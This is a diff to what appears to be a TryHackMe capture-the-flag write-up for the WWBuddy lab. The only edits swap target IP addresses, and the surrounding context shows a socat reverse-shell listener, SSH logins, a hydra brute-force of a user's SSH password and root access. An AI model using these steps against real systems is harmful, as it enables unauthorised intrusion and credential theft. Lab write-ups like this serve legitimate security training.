@@ -655,7 +655,7 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 └─# socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:443
 2023/01/06 01:01:29 socat[50932] N opening character device "/dev/pts/2" for reading and writing
 2023/01/06 01:01:29 socat[50932] N listening on AF=2 0.0.0.0:443
-                                                                2023/01/06 01:02:35 socat[50932] N accepting connection from AF=2 10.10.114.1:39662 on AF=2 10.9.0.253:443
+                                                                2023/01/06 01:02:35 socat[50932] N accepting connection from AF=2 10.10.94.193:39662 on AF=2 10.9.0.253:443
                                                                2023/01/06 01:02:35 socat[50932] N starting data transfer loop with FDs [5,5] and [7,7]
                                            www-data@wwbuddy:/var/www/html/admin$ 
 www-data@wwbuddy:/var/www/html/admin$ export TERM=xterm-256color
@@ -673,7 +673,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
        valid_lft forever preferred_lft forever
 2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
     link/ether 02:be:79:84:16:8b brd ff:ff:ff:ff:ff:ff
-    inet 10.10.114.1/16 brd 10.10.255.255 scope global dynamic eth0
+    inet 10.10.94.193/16 brd 10.10.255.255 scope global dynamic eth0
        valid_lft 2578sec preferred_lft 2578sec
     inet6 fe80::be:79ff:fe84:168b/64 scope link 
        valid_lft forever preferred_lft forever
@@ -784,7 +784,7 @@ Found user `roberto`'s password!
 ```
 ┌──(root🌸siunam)-[~/ctf/thm/ctf/WWBuddy]
 └─# ssh roberto@$RHOSTS   
-roberto@10.10.114.1's password: 
+roberto@10.10.94.193's password: 
 [...]
 $ whoami;hostname;id;ip a
 roberto
@@ -798,7 +798,7 @@ uid=1001(roberto) gid=1001(roberto) groups=1001(roberto),200(developer)
        valid_lft forever preferred_lft forever
 2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
     link/ether 02:be:79:84:16:8b brd ff:ff:ff:ff:ff:ff
-    inet 10.10.114.1/16 brd 10.10.255.255 scope global dynamic eth0
+    inet 10.10.94.193/16 brd 10.10.255.255 scope global dynamic eth0
        valid_lft 3345sec preferred_lft 3345sec
     inet6 fe80::be:79ff:fe84:168b/64 scope link 
        valid_lft forever preferred_lft forever
@@ -943,7 +943,7 @@ if __name__ == '__main__':
 ┌──(root🌸siunam)-[~/ctf/thm/ctf/WWBuddy]
 └─# hydra -l 'jenny' -P wordlist_brithday.txt ssh://$RHOSTS
 [...]
-[22][ssh] host: 10.10.114.1   login: jenny   password: {Redacted}
+[22][ssh] host: 10.10.94.193   login: jenny   password: {Redacted}
 ```
 
 Found it!
@@ -952,7 +952,7 @@ Found it!
 ```
 ┌──(root🌸siunam)-[~/ctf/thm/ctf/WWBuddy]
 └─# ssh jenny@$RHOSTS      
-jenny@10.10.114.1's password: 
+jenny@10.10.94.193's password: 
 [...]
 $ whoami;hostname;id;ip a
 jenny
@@ -966,7 +966,7 @@ uid=1002(jenny) gid=1002(jenny) groups=1002(jenny)
        valid_lft forever preferred_lft forever
 2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
     link/ether 02:be:79:84:16:8b brd ff:ff:ff:ff:ff:ff
-    inet 10.10.114.1/16 brd 10.10.255.255 scope global dynamic eth0
+    inet 10.10.94.193/16 brd 10.10.255.255 scope global dynamic eth0
        valid_lft 3082sec preferred_lft 3082sec
     inet6 fe80::be:79ff:fe84:168b/64 scope link 
        valid_lft forever preferred_lft forever
@@ -1072,7 +1072,7 @@ uid=0(root) gid=1002(jenny) groups=1002(jenny)
        valid_lft forever preferred_lft forever
 2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
     link/ether 02:a7:ab:83:83:c7 brd ff:ff:ff:ff:ff:ff
-    inet 10.10.72.179/16 brd 10.10.255.255 scope global dynamic eth0
+    inet 10.10.94.193/16 brd 10.10.255.255 scope global dynamic eth0
        valid_lft 3497sec preferred_lft 3497sec
     inet6 fe80::a7:abff:fe83:83c7/64 scope link 
        valid_lft forever preferred_lft forever
